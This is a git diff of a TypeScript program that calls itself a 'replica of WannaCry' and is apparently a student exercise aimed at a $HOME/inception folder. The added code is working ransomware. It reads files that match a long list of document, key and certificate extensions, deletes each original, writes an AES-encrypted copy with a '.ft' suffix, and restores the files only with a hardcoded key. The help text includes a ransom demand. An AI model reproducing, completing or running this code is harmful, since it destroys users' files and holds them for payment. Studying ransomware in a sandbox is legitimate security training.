@@ -1,8 +1,11 @@
 import * as crypto from "crypto";
+import fs from 'fs';
 
 const KEY: string = 'IThr1YRwjTxtrtzbM7RUbF0UdVDx9qNjYTryvf5s1Gih9xnSKl51INbX3NgPcQEJ3W-1ZtpJM1LP2gszMNqfWQ';
-let silent_flag: number = 0;
-let reversed: number = 0;
+let key: string = crypto.createHash('sha256').update(KEY).digest('base64').substring(0, 32);
+const algo: string = 'aes-256-ctr';
+let silent: boolean = false;
+let dir_path: string | undefined;
 
 const extensions: string[] = [
     ".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw",
@@ -25,96 +28,131 @@ const extensions: string[] = [
     ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm", ".docb", ".docx", ".doc"
 ];
 
-const display_ver = ():void => {
-    console.log("Version 1.0");
-}
-
 const display_help = ():void => {
-    console.log('This is a replica of WannaCry');
-    console.log('--reverse/-r [KEY] : reverse the infection');
-    console.log('--silent/-s : the program will not produce any output');
-    console.log('--version/-v: display the version of the program');
+    console.log('\t- This is a replica of WannaCry');
+    console.log('\t- Send 1000 Wallet to loumouli to receive the key needed for decrypting your file')
+    console.log('\t\t--reverse/-r [KEY] : reverse the infection');
+    console.log('\t\t--silent/-s : the program will not produce any output');
+    console.log('\t\t--version/-v: display the version of the program');
 }
 
-const decrypt = (buff_encrypted: Buffer, algo: string, key: string): Buffer => {
+const check_ext = (file: string): boolean => {
+    return extensions.some(ext => file.endsWith(ext));
+}
+
+const decrypt = (buff_encrypted: Buffer): Buffer => {
     const iv: Buffer = buff_encrypted.subarray(0, 16);
     buff_encrypted = buff_encrypted.subarray(16);
     const decipher: crypto.Decipher = crypto.createDecipheriv(algo, key, iv);
     return Buffer.concat([decipher.update(buff_encrypted), decipher.final()]);
 }
 
-const reverse_file = (key: string):void => {
-    console.log('all file reversed thank to key: ', key);
-}
-
-const check_ext = (file: string): boolean => {
-    let result: boolean = false;
-    for (const ext in extensions) {
-        if (file.substring(-ext.length) === ext) {
-            result = true;
-            return result;
-        }
-    }
-    return result;
-}
-
-const encrypt = (buffer: string, algo:string, key: string): Buffer => {
+const encrypt = (buffer: Buffer): Buffer => {
     const iv: Buffer = crypto.randomBytes(16);
     const cipher: crypto.Cipher = crypto.createCipheriv(algo, key, iv);
     return Buffer.concat([iv, cipher.update(buffer), cipher.final()]);
 }
 
-const perform_encrypt = async (): Promise<void> => {
-    const crypto = require('crypto');
-    const algo: string = 'aes-256-ctr';
-    let key = crypto.createHash('sha256').update(KEY).digest('base64').substring(0, 32);
-    const path = require('path');
-    const fs = require('fs');
-    const dir_path: string = "/root/inception";
-    let files = await fs.promises.readdir(dir_path);
-    files.filter((file: string) => check_ext(file));
-    files.forEach((file: string) => {
-        console.log(file);
-    })
-    //create a list of all file inside $HOME/inception
-    //for each file, read it/ delete it/ encrypt/ write itZ
+const reverse_file = async (user_key: string): Promise<void> => {
+    if (user_key != key)
+        throw new Error('Wrong Key...');
+    let files: string[];
+    try {
+        // @ts-ignore
+        files = await fs.promises.readdir(dir_path);
+    } catch (err) {
+        throw new Error("reverse_file: readdir: " + err);
+    }
+    files = files.filter((file: string) => file.endsWith('.ft'));
+    for (const iter in files) {
+        const file: string = files[iter];
+        let path: string = dir_path + '/' + file;
+        try {
+            let content: Buffer = await fs.promises.readFile(path);
+            if (content.toLocaleString() === '')
+                throw new Error('Error reading file');
+            await fs.promises.unlink(path);
+            let content_decrypt: Buffer = decrypt(content);
+            path = path.substring(0, path.lastIndexOf('.'));
+            await fs.promises.writeFile(path, content_decrypt);
+            if (!silent)
+                console.log(file + ' decrypted');
+        } catch (err) {
+            console.warn(path + ' :', String(err));
+        }
+    }
 }
 
+const perform_encrypt = async (): Promise<void> => {
+    let files: string[];
+    try {
+        // @ts-ignore
+        files = await fs.promises.readdir(dir_path);
+    }
+     catch (err) {
+        throw new Error("perform_encrypt: readdir: " + err);
+     }
+    files = files.filter((file: string) => check_ext(file));
+    for (const iter in files) {
+        const path: string = dir_path + '/' + files[iter];
+        try {
+            let content: Buffer = await fs.promises.readFile(path);
+            if (content.toLocaleString() === '')
+                throw new Error('Error reading file');
+            await fs.promises.unlink(path);
+            let content_encrypted: Buffer = encrypt(content);
+            await fs.promises.writeFile(path + '.ft', content_encrypted);
+            if (!silent)
+                console.log(files[iter] + ' encrypted');
+        } catch (err) {
+            console.warn(path + ':', String(err));
+        }
 
+    }
+}
 
 const main = async (argv: any): Promise<void> => {
     argv.shift();
     argv.shift(); // pop two first value (name of program,...)
-    argv.forEach((value: any, index: number): void => {
-        console.log('index = ', index);
-        if (value === '-v' || value === '--version')
-            display_ver();
-        else if (value === '-h'  || value === '--help')
-            display_help();
-        else if (value === '-s'  || value === '--silent') {
-            console.log('switching to silent version');
-            silent_flag = 1;
+    for (const value of argv) {
+        const index: number = argv.indexOf(value);
+        if (value === '-v' || value === '--version') {
+            console.log("Version 1.0");
+            process.exit(0);
         }
+        else if (value === '-h'  || value === '--help') {
+            display_help();
+            process.exit(0);
+        }
+        else if (value === '-s'  || value === '--silent')
+            silent = true;
         else if (value === '-r' || value === '--reverse') {
             if (argv.length <= index + 1) {
-                console.error('Cant find key after --reverse option');
+                console.warn('Cant find key after --reverse/-r');
+                display_help();
                 throw new Error("Runtime Error");
             }
-            reverse_file(argv[index + 1]);
-            argv.splice(index + 1, 1);
-            reversed = 1;
+            await reverse_file(argv[index + 1]);
+            process.exit(1);
         }
         else {
-            console.error("Wrong flag");
-            console.error('Aborting execution');
-            throw new Error("Runtime Error");
+            display_help();
+            throw new Error('Wrong flag');
         }
 
-    })
-    if (!reversed) {
-        console.log('performing encryption');
-        await perform_encrypt();
     }
+    await perform_encrypt();
 }
 
-let tmp = await main(process.argv);
+dir_path = process.env.HOME;
+if (dir_path == undefined) {
+    console.warn('cant find $HOME env value');
+} else {
+    try {
+        dir_path += '/inception';
+        if (dir_path)
+            await main(process.argv);
+    } catch (err) {
+        console.warn(String(err));
+    }
+}
